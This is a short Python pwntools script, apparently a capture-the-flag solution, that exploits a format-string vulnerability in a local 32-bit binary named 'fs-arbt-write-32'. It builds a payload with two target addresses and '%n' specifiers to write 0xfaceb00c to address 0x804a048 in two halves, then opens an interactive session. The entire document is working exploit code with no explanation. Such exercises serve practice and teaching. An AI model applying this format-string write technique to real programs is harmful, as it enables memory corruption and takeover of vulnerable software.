from pwn import *
p = process("./fs-arbt-write-32")

target_addr = 0x804a048
target_num  = 0xfaceb00c


front = target_num & 0xffff
front = front - 8

back = (target_num >>16) - (front+8)
while back < 0:
    back += 0x10000

payload = p32(target_addr) + p32(target_addr+2)
payload = payload + "%" + "%05d" % front + "x%7$n"
payload = payload + "%" + "%05d" % back + "x%8$n"

p.sendline(payload)

p.interactive()
